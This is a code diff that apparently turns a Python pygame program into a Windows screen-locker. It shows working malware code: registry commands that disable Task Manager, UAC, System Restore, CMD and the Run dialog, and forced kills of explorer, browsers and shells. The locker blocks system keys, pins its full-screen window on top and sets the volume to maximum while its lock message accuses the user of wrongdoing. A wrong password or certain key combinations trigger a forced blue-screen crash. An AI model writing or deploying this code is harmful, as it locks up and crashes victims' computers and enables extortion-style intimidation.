@@ -1,19 +1,136 @@
+import ctypes
+
+import keyboard
 import pygame
 import sys
 import os
 import time
+from ctypes import windll, c_int, c_uint, c_ulong, byref, cast, POINTER
 import subprocess
+import win32gui
+import win32con
+from multiprocessing import Process
+from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+
+# Константы для раскладок
+LANG_ENGLISH_US = 0x0409  # Код для английской раскладки
+HWND_BROADCAST = 0xFFFF
+WM_INPUTLANGCHANGEREQUEST = 0x0050
+
+# Загрузка раскладки
+def set_keyboard_layout(language_code):
+    user32 = ctypes.WinDLL("user32")
+    layout = user32.LoadKeyboardLayoutW(f"{language_code:04X}{language_code:04X}", 1)
+    user32.PostMessageW(HWND_BROADCAST, WM_INPUTLANGCHANGEREQUEST, 0, layout)
+
+set_keyboard_layout(LANG_ENGLISH_US)
+
+def kill_app():
+    try:
+        subprocess.call("taskkill /F /IM explorer.exe", shell=True)
+        subprocess.call("taskkill /F /IM taskmgr.exe", shell=True)
+        subprocess.call("taskkill /F /IM regedit.exe", shell=True)
+        subprocess.call("taskkill /F /IM notepad.exe", shell=True)
+        subprocess.call("taskkill /F /IM resmon.exe", shell=True)
+        subprocess.call("taskkill /F /IM control.exe", shell=True)
+        subprocess.call("taskkill /F /IM firefox.exe", shell=True)
+        subprocess.call("taskkill /F /IM chrome.exe", shell=True)
+        subprocess.call("taskkill /F /IM ProcessHacker.exe", shell=True)
+        subprocess.call("taskkill /F /IM perfmon.exe", shell=True)
+        subprocess.call("taskkill /F /IM powershell.exe", shell=True)
+        subprocess.call("taskkill /F /IM mrt.exe", shell=True)
+        subprocess.call("taskkill /F /IM SecHealthUI.exe", shell=True)
+        subprocess.call("taskkill /F /IM javaw.exe", shell=True)
+        subprocess.call("taskkill /F /IM discord.exe", shell=True)
+        subprocess.call("taskkill /F /IM opera.exe", shell=True)
+        subprocess.call("taskkill /F /IM browser.exe", shell=True)
+        subprocess.call("taskkill /F /IM telegram.exe", shell=True)
+        subprocess.call("taskkill /F /IM cmd.exe", shell=True)
+    except:
+        print("похуй мне")
+
+def MinusRegedit():
+    commands = [
+        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLowDiskSpaceChecks /t REG_DWORD /d 1 /f',
+        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDriveTypeAutoRun /t REG_DWORD /d 255 /f',
+        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLogoff /t REG_DWORD /d 1 /f',
+        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f',
+        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuPinnedList /t REG_DWORD /d 1 /f',
+        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMorePrograms /t REG_DWORD /d 1 /f',
+        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMyGames /t REG_DWORD /d 1 /f',
+        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMyMusic /t REG_DWORD /d 1 /f',
+        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuNetworkPlaces /t REG_DWORD /d 1 /f',
+        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideClock /t REG_DWORD /d 1 /f',
+        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f',
+        r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v HideFastUserSwitching /t REG_DWORD /d 1 /f',
+        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableChangePassword /t REG_DWORD /d 1 /f',
+        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f',
+        r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f',
+        r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableConfig /t REG_DWORD /d 1 /f',
+        r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDrives /t REG_DWORD /d 4 /f',
+        r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDesktop /t REG_DWORD /d 1 /f',
+        r'REG ADD "HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 2 /f',
+        r'REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f',
+        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 0 /f'
+    ]
+    # Выполнение всех команд в одном месте
+    for command in commands:
+        try:
+            subprocess.run(command, check=True, shell=True)
+            print(f"Команда выполнена: {command}")
+        except subprocess.CalledProcessError as e:
+            print(f"Ошибка при выполнении команды: {e}")
+
+
+
+MinusRegedit()
 
 # Инициализация Pygame
 pygame.init()
+pygame.mixer.init()
 
 # Установка разрешения экрана
 SCREEN_RESOLUTION = (800, 600)
 
 # Создание полноэкранного окна с заданным разрешением
 screen = pygame.display.set_mode(SCREEN_RESOLUTION, pygame.FULLSCREEN)
+hwnd = pygame.display.get_wm_info()["window"]
+kill_app()
 
-# Определение пути к ресурсам
+
+def get_current_volume():
+    """ Получает текущий уровень громкости через pycaw """
+    devices = AudioUtilities.GetSpeakers()
+    interface = devices.Activate(
+        IAudioEndpointVolume._iid_, 0, None)
+    # Преобразуем interface в правильный тип для вызова метода
+    volume = interface.QueryInterface(IAudioEndpointVolume)
+    return volume.GetMasterVolumeLevelScalar()  # Используем корректный интерфейс
+
+def set_volume(volume_level):
+    """ Устанавливает уровень громкости через pycaw """
+    devices = AudioUtilities.GetSpeakers()
+    interface = devices.Activate(
+        IAudioEndpointVolume._iid_, 0, None)
+    # Преобразуем interface в правильный тип для вызова метода
+    volume = interface.QueryInterface(IAudioEndpointVolume)
+    volume.SetMasterVolumeLevelScalar(volume_level, None)
+
+
+def bring_window_to_front(hwnd):
+    """Переводим окно в передний план с помощью SetWindowPos"""
+    # Восстановить окно, если оно свернуто
+    win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
+    # Установить окно поверх всех
+    win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)
+    # Принудительно установить окно на передний план
+    win32gui.SetWindowPos(hwnd, win32con.HWND_TOP, 0, 0, 0, 0, win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)
+
+def force_focus(hwnd):
+    """Принудительное удержание фокуса в окне"""
+    win32gui.SetFocus(hwnd)
+
+
 if getattr(sys, 'frozen', False):
     # Если программа 'заморожена' (собрана в exe)
     application_path = sys._MEIPASS
@@ -25,11 +142,74 @@ else:
 background_path = os.path.join(application_path, 'background.png')
 background = pygame.image.load(background_path)
 
+music_path = os.path.join(application_path, "music.wav")
+pygame.mixer.music.load(music_path)
+pygame.mixer.music.play(-1)  # Бесконечное воспроизведение
+
 # Масштабирование изображения под размер экрана
 background = pygame.transform.scale(background, SCREEN_RESOLUTION)
 
-# Путь к c_avc.exe
-c_avc_path = os.path.join(application_path, 'c_avc.exe')
+def PlusRegedit():
+    commands = [
+        r'REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLowDiskSpaceChecks /f',
+        r'REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDriveTypeAutoRun /f',
+        r'REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLogoff /f',
+        r'REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /f',
+        r'REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuPinnedList /f',
+        r'REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMorePrograms /f',
+        r'REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMyGames /f',
+        r'REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMyMusic /f',
+        r'REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuNetworkPlaces /f',
+        r'REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideClock /f',
+        r'REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /f',
+        r'REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v HideFastUserSwitching /f',
+        r'REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableChangePassword /f',
+        r'REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /f',
+        r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 1 /f',
+        r'REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableConfig /f',
+        r'REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDrives /f',
+        r'REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDesktop /f',
+        r'REG DELETE "HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableCMD /f',
+        r'REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /f',
+        r'REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /f'
+    ]
+
+    for command in commands:
+        try:
+            subprocess.run(command, check=True, shell=True)
+            print(f"Команда выполнена: {command}")
+        except subprocess.CalledProcessError as e:
+            print(f"Ошибка при выполнении команды: {e}")
+
+def BSOD():
+    null_pointer = POINTER(c_int)()
+    privilege_id = c_uint(19)
+    enable_privilege = c_uint(1)
+    current_thread = c_uint(0)
+    privilege_status = c_int()
+    windll.ntdll.RtlAdjustPrivilege(
+        privilege_id,
+        enable_privilege,
+        current_thread,
+        byref(privilege_status)
+    )
+    error_code = c_ulong(0xC000007B)
+    arg_count = c_ulong(0)
+    response_status = c_uint()
+    windll.ntdll.NtRaiseHardError(
+        error_code,
+        arg_count,
+        null_pointer,
+        null_pointer,
+        c_uint(6),
+        byref(response_status)
+    )
+
+def block_keys():
+    """Блокирует клавиши: Win, Ctrl, Tab, Alt, Delete, Shift."""
+    keys_to_block = ['win', 'ctrl', 'tab', 'alt', 'delete', 'shift', 'f4']
+    for key in keys_to_block:
+        keyboard.block_key(key)
 
 def create_text_surface(text, font_name, font_size, text_color, bg_color=None):
     """
@@ -89,8 +269,10 @@ def main():
     """
     Основной цикл программы. Обрабатывает события и отрисовывает изображение на экране.
     """
+
     start_time = time.time()
     time_limit = 5 * 60  # Лимит времени в секундах (5 минут)
+
 
     # Большой текст с пустыми строками для разделения на блоки
     big_text = """Your computer is locked due to your active involvement in 
@@ -161,6 +343,16 @@ def main():
         seconds = remaining_time % 60
         time_text = f"{minutes:02}:{seconds:02}"
 
+        block_keys()
+        bring_window_to_front(hwnd)
+        force_focus(hwnd)
+        current_volume = get_current_volume()
+
+        # Если громкость меньше 100%, устанавливаем её на 100%
+        if current_volume < 1.0:
+            set_volume(1.0)  # Устанавливаем громкость на максимум
+
+
         # Обновление текста таймера
         text_surface2, text_rect2 = create_text_surface(
             text=time_text,
@@ -170,6 +362,12 @@ def main():
             bg_color=(255, 0, 0),
         )
         text_rect2.topleft = (260, 10)
+
+        # Отслеживание сочетаний клавиш
+        if keyboard.is_pressed('win+del') or keyboard.is_pressed('win+g') or keyboard.is_pressed('win+l'):
+            BSOD()
+            pygame.quit()
+            sys.exit()
 
         # Если время истекло, завершаем программу
         if remaining_time <= 0:
@@ -183,6 +381,7 @@ def main():
                 sys.exit()
             # Выход по нажатию клавиши ESC
             if event.type == pygame.KEYDOWN:
+                # Блокируем клавиши Win
                 if event.key == pygame.K_ESCAPE:
                     pygame.quit()
                     sys.exit()
@@ -190,12 +389,15 @@ def main():
                     if event.key == pygame.K_RETURN:
                         if text == "admin":
                             print("Успех! Пароль верный.")
+                            PlusRegedit()
                             pygame.quit()
                             sys.exit()
                         else:
                             print(f"Пароль не подходит. {text}")
                             text = 'WRONG'  # Заменяем текст на "WRONG"
                             # Запуск c_avc.exe параллельно
+                            time.sleep(2)
+                            BSOD()
                             # subprocess.Popen([c_avc_path])
                     elif event.key == pygame.K_BACKSPACE:
                         text = text[:-1]
